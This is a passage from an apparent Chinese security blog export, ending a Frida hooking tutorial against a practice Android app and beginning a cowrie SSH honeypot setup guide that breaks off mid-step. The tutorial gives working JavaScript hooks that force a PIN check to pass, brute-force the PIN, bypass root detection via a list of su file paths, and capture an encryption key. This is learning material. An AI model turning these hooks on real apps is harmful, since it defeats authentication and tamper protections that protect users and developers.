bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ frida-ps -Ua<br>  PID  Name          Identifier<br>-----  ------------  ---------------------------------------<br>10372  Chrome        com.android.chrome<br>25757  Frida Demo    infosecadventures.fridademo     <span class="hljs-comment"># 我们的目标app</span><br>10151  Gmail         com.google.android.gm<br> 1465  Google 应用     com.google.android.googlequicksearchbox<br> 1465  Google 应用     com.google.android.googlequicksearchbox<br>30443  Hangouts      com.google.android.talk<br>21527  MT管理器         bin.mt.plus<br>10079  SuperSU       eu.chainfire.supersu<br>22018  Uncrackable1  owasp.mstg.uncrackable1<br> 8943  YouTube       com.google.android.youtube<br>10120  健身            com.google.android.apps.fitness<br> 6238  日历            com.google.android.calendar<br>22609  时钟            com.google.android.deskclock<br>10388  相册            com.google.android.apps.photos<br></code></pre></td></tr></table></figure><h3 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a>注入实战</h3><p>创建run.py作为加载器，这个py脚本在整个过程都会用到，<strong>需要修改里面的是js脚本的名字</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># run.py</span><br><span class="hljs-keyword">import</span> frida<br><br>process_name = <span class="hljs-string">&#x27;Frida Demo&#x27;</span>  <span class="hljs-comment"># 注意这里是frida-ps -Ua的Name字段</span><br><br><span class="hljs-comment"># 发送信息回调函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">on_message</span>(<span class="hljs-params">message, data</span>):</span><br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] <span class="hljs-subst">&#123;message[<span class="hljs-string">&#x27;payload&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        device = frida.get_usb_device()<br>    <span class="hljs-keyword">except</span>:<br>        device = frida.get_remote_device()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> device:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* 连接到Frida Server失败&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        process = device.attach(process_name)<br><br>        <span class="hljs-comment"># 加载JS脚本</span><br>        js = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pin_auto_hook.js&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).read()   <span class="hljs-comment"># 需要修改的地方，js脚本名：pin_auto_hook.js</span><br>        script = process.create_script(js)<br>        script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>        script.load()<br><br>        <span class="hljs-comment"># 读取返回输入</span><br>        <span class="hljs-built_in">input</span>()<br>        script.unload()<br></code></pre></td></tr></table></figure><p>我们使用的反编译软件是jadx，使用该软件打开apk文件可以看到该apk的java代码，下载地址：<a href="https://github.com/skylot/jadx/releases">https://github.com/skylot/jadx/releases</a> ，打开后下载自己需要的版本即可，我的操作系统是windows，下载的是如图红色剪头标注的版本</p><img src="/img/frida+frida-demo hook技术学习/5.jpg"><h4 id="PIN码暴力破解"><a href="#PIN码暴力破解" class="headerlink" title="PIN码暴力破解"></a>PIN码暴力破解</h4><h5 id="第一关代码分析"><a href="#第一关代码分析" class="headerlink" title="第一关代码分析"></a>第一关代码分析</h5><p>我们使用jadx打开frida-demo.apk，查看第一关的代码书写</p><img src="/img/frida+frida-demo hook技术学习/6.jpg"><p>分析该代码逻辑可知，在我们输入PIN码之后，程序会和base加密后的字符串”NDg2Mw==”作比较，当一样时，返回true，表示登录成功，不一样时返回false，那我们的思路就有了</p><ol><li><p>让该函数的返回值为true</p></li><li><p>暴力破解该PIN码</p></li></ol><h5 id="JS代码1"><a href="#JS代码1" class="headerlink" title="JS代码1"></a>JS代码1</h5><p>让该函数的返回值为true</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// pin_hook.js</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;加载成功&#x27;</span>);<br><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-comment">//获取指定类</span><br>    <span class="hljs-keyword">var</span> cls = Java.use(<span class="hljs-string">&#x27;infosecadventures.fridademo.utils.PinUtil&#x27;</span>);<br><br>    <span class="hljs-comment">//Hook指定函数</span><br>    cls.checkPin.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">arg1</span>) </span>&#123;<br><br>        <span class="hljs-comment">//打印入参</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;encrypt-in&#x27;</span>, arg1);<br><br>        <span class="hljs-comment">//返回true</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>我们输入”1”</p><img src="/img/frida+frida-demo hook技术学习/1.jpg"><p>但是依然显示的是PIN码正确，因为函数的返回值被我们修改过了，PIN码破解成功</p><img src="/img/frida+frida-demo hook技术学习/pin_success.png"><h5 id="JS代码2"><a href="#JS代码2" class="headerlink" title="JS代码2"></a>JS代码2</h5><p>输入PIN码后会自动进行暴力破解PIN码，对比JS1增加了一个for循环来进行PIN码的暴力破解</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// pin_auto_hook.js</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">var</span> cls = Java.use(<span class="hljs-string">&#x27;infosecadventures.fridademo.utils.PinUtil&#x27;</span>);<br><br>    <span class="hljs-comment">//HookCheckPin函数</span><br>    cls.checkPin.overload(<span class="hljs-string">&quot;java.lang.String&quot;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">arg1</span>) </span>&#123;<br><br>        <span class="hljs-comment">//函数进入</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;开始破解密码&#x27;</span>);<br><br>        <span class="hljs-comment">//暴力破解</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;; i++) &#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.checkPin(i.toString());<br>            <span class="hljs-keyword">if</span> (result) &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;破解完成，密码是&#x27;</span>, i)<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;密码错误&#x27;</span>, i)<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-comment">//返回给原函数的调用</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>程序运行截图</p><img src="/img/frida+frida-demo hook技术学习/2.jpg"><p>PIN码破解成功</p><img src="/img/frida+frida-demo hook技术学习/pin_success.png"><h4 id="ROOT环境检测"><a href="#ROOT环境检测" class="headerlink" title="ROOT环境检测"></a>ROOT环境检测</h4><h5 id="第二关代码分析"><a href="#第二关代码分析" class="headerlink" title="第二关代码分析"></a>第二关代码分析</h5><img src="/img/frida+frida-demo hook技术学习/7.jpg"><p>第二关是通过判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;/system/app/Superuser.apk&quot;</span>, <span class="hljs-string">&quot;/sbin/su&quot;</span>, <span class="hljs-string">&quot;/system/bin/su&quot;</span>, <span class="hljs-string">&quot;/system/xbin/su&quot;</span>, <span class="hljs-string">&quot;/data/local/xbin/su&quot;</span>, <span class="hljs-string">&quot;/data/local/bin/su&quot;</span>, <span class="hljs-string">&quot;/system/sd/xbin/su&quot;</span>, <span class="hljs-string">&quot;/system/bin/failsafe/su&quot;</span>, <span class="hljs-string">&quot;/data/local/su&quot;</span>, <span class="hljs-string">&quot;/su/bin/su&quot;</span><br></code></pre></td></tr></table></figure><p>这些路径是否存在，如果存在则返回true，这时会提示你手机是root过的，我们的方法还是两种</p><ol><li><p>直接修改isRootAvailable()函数的返回值，让函数的返回值为false</p></li><li><p>修改检测特征文件的返回值</p></li></ol><h5 id="JS代码1-1"><a href="#JS代码1-1" class="headerlink" title="JS代码1"></a>JS代码1</h5><p>原理：修改函数返回值来绕过root环境检测</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// root_bypass_1.js</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-comment">//获取指定类</span><br>    <span class="hljs-keyword">var</span> cls = Java.use(<span class="hljs-string">&#x27;infosecadventures.fridademo.utils.RootUtil&#x27;</span>);<br><br>    <span class="hljs-comment">//Hook指定函数</span><br>    cls.isRootAvailable.overload().implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-comment">//进入函数</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;isRootAvailable-in&#x27;</span>);<br><br>        <span class="hljs-comment">//调用原函数</span><br>        <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.isRootAvailable();<br><br>        <span class="hljs-comment">//打印出参</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;isRootAvailable-out&#x27;</span>, result);<br><br>        <span class="hljs-comment">//返回给原函数的调用，直接返回false</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;);<br></code></pre></td></tr></table></figure><p>程序运行截图</p><img src="/img/frida+frida-demo hook技术学习/3.jpg"><p>bypass root环境检测</p><img src="/img/frida+frida-demo hook技术学习/root_bypass.png"><h5 id="JS代码2-1"><a href="#JS代码2-1" class="headerlink" title="JS代码2"></a>JS代码2</h5><p>原理：将检测到的存在的路径返回值都修改为false来绕过root环境检测</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// root_bypass_2.js</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//获取指定类</span><br>    <span class="hljs-keyword">var</span> cls2 = Java.use(<span class="hljs-string">&#x27;java.io.File&#x27;</span>);<br><br>    <span class="hljs-comment">//Hook指定函数</span><br>    cls2.exists.overload().implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>        <span class="hljs-comment">//进入函数</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;exists-in&#x27;</span>);<br><br>        <span class="hljs-comment">//获取自身的path</span><br>        <span class="hljs-keyword">var</span> mypath = <span class="hljs-built_in">this</span>.getPath();<br><br>        <span class="hljs-comment">//root特征文件列表</span><br>        <span class="hljs-keyword">var</span> paths = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-string">&quot;/system/app/Superuser.apk&quot;</span>, <span class="hljs-string">&quot;/sbin/su&quot;</span>,<br>            <span class="hljs-string">&quot;/system/bin/su&quot;</span>, <span class="hljs-string">&quot;/system/xbin/su&quot;</span>,<br>            <span class="hljs-string">&quot;/data/local/xbin/su&quot;</span>, <span class="hljs-string">&quot;/data/local/bin/su&quot;</span>,<br>            <span class="hljs-string">&quot;/system/sd/xbin/su&quot;</span>, <span class="hljs-string">&quot;/system/bin/failsafe/su&quot;</span>,<br>            <span class="hljs-string">&quot;/data/local/su&quot;</span>, <span class="hljs-string">&quot;/su/bin/su&quot;</span>);<br><br>        <span class="hljs-comment">//判断路径是否匹配root特征</span><br>        <span class="hljs-keyword">var</span> flag = <span class="hljs-literal">false</span>;<br><br>        paths.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">path</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (mypath == path) &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;检测到root特征文件&#x27;</span>, path);<br>                flag = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-keyword">if</span> (!flag) &#123;<br>            <span class="hljs-comment">//调用原函数，避免影响正常功能</span><br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.exists();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//返回false，绕过root检测</span><br>            result = <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;exists-out&#x27;</span>, result)<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>程序运行截图</p><img src="/img/frida+frida-demo hook技术学习/4.jpg"><p>bypass root环境检测</p><img src="/img/frida+frida-demo hook技术学习/root_bypass.png"><h4 id="加密key获取"><a href="#加密key获取" class="headerlink" title="加密key获取"></a>加密key获取</h4><h5 id="第三关代码分析"><a href="#第三关代码分析" class="headerlink" title="第三关代码分析"></a>第三关代码分析</h5><p>这关我们传入一个value，系统会给一个key对value进行加密，加密的结果会显示在下方的输入框内，如图所示，输入”1”，加密后的结果为一堆乱码（这不是关键的，这关是要获取key，只是看一下加密的结果~）</p><img src="/img/frida+frida-demo hook技术学习/encrypt.png"><h5 id="JS代码"><a href="#JS代码" class="headerlink" title="JS代码"></a>JS代码</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// encrypt.js</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-comment">//获取指定类</span><br>    <span class="hljs-keyword">var</span> cls = Java.use(<span class="hljs-string">&#x27;infosecadventures.fridademo.utils.EncryptionUtil&#x27;</span>);<br><br>    <span class="hljs-comment">//Hook指定函数</span><br>    cls.encrypt.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">arg1, arg2</span>) </span>&#123;<br><br>        <span class="hljs-comment">//打印入参</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;encrypt-in&#x27;</span>, arg1, arg2);<br><br>        <span class="hljs-comment">//调用原函数</span><br>        <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.encrypt(arg1, arg2);<br><br>        <span class="hljs-comment">//打印出参</span><br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;encrypt-out&#x27;</span>, result);<br><br>        <span class="hljs-comment">//返回给原函数的调用</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>程序运行截图</p><img src="/img/frida+frida-demo hook技术学习/9.jpg"><p>获取到了加密的key：infosecadventure</p><img src="/img/frida+frida-demo hook技术学习/encrypt_ok.png"><h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><p>练习的frida-demo.apk以及脚本已上传至github代码仓库：<a href="https://github.com/M0untainShley/frida-demo">https://github.com/M0untainShley/frida-demo</a> ，需要的可以去自取 </p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>复现的过程中遇到了一些问题，感谢chrxw师傅的帮助，附上师傅的博客地址和参考文章地址</p><ul><li><p>博客地址：<a href="https://blog.chrxw.com/">https://blog.chrxw.com/</a></p></li><li><p>参考连接：<a href="https://blog.chrxw.com/archives/2020/07/18/1301.html">https://blog.chrxw.com/archives/2020/07/18/1301.html</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
      <tag>frida</tag>
      
      <tag>Hook技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cowrie蜜罐学习</title>
    <link href="/2021/08/17/cowrie%E8%9C%9C%E7%BD%90%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/08/17/cowrie%E8%9C%9C%E7%BD%90%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这几天翻了翻l1nk3r师傅的博客，突然发现一个有趣的东西—蜜罐，这东西以前只是听过没自己用过，于是就自己也想着部署一下玩玩</p><p>部署cowrie蜜罐使用的服务器：阿里云 Ubuntu 18.04</p><p><strong>注意：不要使用Ubuntu 16.04，现在cowrie不支持python3.5，Ubuntu  16.04自带的就是python3.5，很麻烦…</strong></p><p>现在cowrie不支持python3.5</p><p>现在cowrie不支持python3.5</p><p>现在cowrie不支持python3.5</p><p>重要的事情说三遍！！！</p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>八步部署cowrie蜜罐</p><h4 id="Step1：安装依赖"><a href="#Step1：安装依赖" class="headerlink" title="Step1：安装依赖"></a>Step1：安装依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新软件仓库，不然会报错</span><br>$ sudo apt-get update<br><br><span class="hljs-comment"># 安装依赖</span><br>$ sudo apt-get install git python-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv<br></code></pre></td></tr></table></figure><h4 id="Step2：创建蜜罐使用的账户（cowrie）"><a href="#Step2：创建蜜罐使用的账户（cowrie）" class="headerlink" title="Step2：创建蜜罐使用的账户（cowrie）"></a>Step2：创建蜜罐使用的账户（cowrie）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建新用户，一路回车即可</span><br>$ sudo adduser --disabled-password cowrie<br>sudo: unable to resolve host aliyun<br>Adding user `cowrie<span class="hljs-string">&#x27; ...</span><br><span class="hljs-string">Adding new group `cowrie&#x27;</span> (1001) ...<br>Adding new user `cowrie<span class="hljs-string">&#x27; (1001) with group `cowrie&#x27;</span> ...<br>Creating home directory `/home/cowrie<span class="hljs-string">&#x27; ...</span><br><span class="hljs-string">Copying files from `/etc/skel&#x27;</span> ...<br>Changing the user information <span class="hljs-keyword">for</span> cowrie<br>Enter the new value, or press ENTER <span class="hljs-keyword">for</span> the default<br>        Full Name []:<br>        Room Number []:<br>        Work Phone []:<br>        Home Phone []:<br>        Other []:<br>Is the information correct? [Y/n]<br><br><span class="hljs-comment"># 切换用户</span><br>$ sudo su - cowrie<br></code></pre></td></tr></table></figure><p>网上没找到关于adduser “–disabled-password” 这个参数的说明，于是我man了一下，这个参数的意思是：（暂时）不给此账户设置密码，直到这个账户被设置密码之前这个账户的都是不能使用的，但是这个账户可以通过非密码认证的方式进行登录（例如通过ssh公钥进行登录）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># --disabled-login</span><br><span class="hljs-comment"># Do not run passwd to set the password.  The user won&#x27;t be able to use her account until the password is set</span><br><br><span class="hljs-comment"># --disabled-password</span><br><span class="hljs-comment"># Like --disabled-login, but logins are still possible (for example using SSH RSA keys) but not using password authentication</span><br></code></pre></td></tr></table></figure><h4 id="Step3：下载蜜罐项目"><a href="#Step3：下载蜜罐项目" class="headerlink" title="Step3：下载蜜罐项目"></a>Step3：下载蜜罐项目</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录</span><br>cowrie@aliyun:~$ <span class="hljs-built_in">pwd</span><br>/home/cowrie<br><br><span class="hljs-comment"># 克隆该项目</span><br>cowrie@aliyun:~$ git <span class="hljs-built_in">clone</span> https://github.com/cowrie/cowrie.git<br><br><span class="hljs-comment"># 查看</span><br>cowrie@aliyun:~$ ls -l<br>total 4<br>drwxrwxr-x 11 cowrie cowrie 4096 Aug 17 14:56 cowrie<br></code></pre></td></tr></table></figure><h4 id="Step4：设置虚拟环境"><a href="#Step4：设置虚拟环境" class="headerlink" title="Step4：设置虚拟环境"></a>Step4：设置虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入目录</span><br>cowrie@aliyun:~$ <span class="hljs-built_in">cd</span> cowrie/<br>cowrie@aliyun:~/cowrie$ <span class="hljs-built_in">pwd</span><br>/home/cowrie/cowrie<br><br><span class="hljs-comment"># 创建cowrie-env虚拟环境，一小会的等待...</span><br>cowrie@aliyun:~/cowrie$ virtualenv --python=python3 cowrie-env<br>Already using interpreter /usr/bin/python3<br>Using base prefix <span class="hljs-string">&#x27;/usr&#x27;</span><br>New python executable <span class="hljs-keyword">in</span> /home/cowrie/cowrie/cowrie-env/bin/python3<br>Also creating executable <span class="hljs-keyword">in</span> /home/cowrie/cowrie/cowrie-env/bin/python<br>Installing setuptools &lt; 51.3, pkg_resources, pip &lt; 21, wheel...done.<br></code></pre></td></tr></table></figure><p>激活虚拟环境并安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cowrie@aliyun:~/cowrie$ <span class="hljs-built_in">source</span> cowrie-env/bin/activate<br>(cowrie-env) cowrie@aliyun:~/cowrie$ pip install --upgrade pip<br>(cowrie-env) cowrie@aliyun:~/cowrie$ pip install --upgrade -r requirements.txt<br></code></pre></td></tr></table></figure><h5 id="Ubuntu-16-04出现的问题（问题记录，参考安装时可直接跳过）"><a href="#Ubuntu-16-04出现的问题（问题记录，参考安装时可直接跳过）" class="headerlink" title="Ubuntu 16.04出现的问题（问题记录，参考安装时可直接跳过）"></a>Ubuntu 16.04出现的问题（问题记录，参考安装时可直接跳过）</h5><p>这里是当时使用Ubuntu 16.04出现的问题，安装python依赖时一直报错，后来换了Ubuntu 18.04，但是还是想把这段插曲记录下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这里使用作者的命令&quot;pip install --upgrade -r requirements.txt&quot;一直提示&quot;Could not find a version that satisfies the requirement ***&quot;，所以我直接手动进行下载了</span><br>(cowrie-env) cowrie@aliyun:~/cowrie$ cat requirements.txt<br>appdirs==1.4.4<br>attrs==21.2.0<br>configparser==5.0.2<br>cryptography==3.4.7<br>packaging==21.0<br>pyasn1_modules==0.2.8<br>pyopenssl==20.0.1<br>pyparsing==2.4.7<br>python-dateutil==2.8.2<br>service_identity==21.1.0<br>tftpy==0.8.1<br>treq==21.5.0<br>twisted==21.2.0<br>bcrypt==3.2.0<br><br><span class="hljs-comment">#这里是上面所有的python依赖</span><br>(cowrie-env) cowrie@aliyun:~/cowrie$ pip install appdirs attrs configparser cryptography packaging pyasn1_modules pyopenssl pyparsing python-dateutil service_identity tftpy treq twisted bcrypt<br></code></pre></td></tr></table></figure><p>虽然暂时解决了（没报错？），但是后面启动容器还是会提示不支持…</p><h4 id="Step5：创建配置文件"><a href="#Step5：创建配置文件" class="headerlink" title="Step5：创建配置文件"></a>Step5：创建配置文件</h4><p>官方文字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 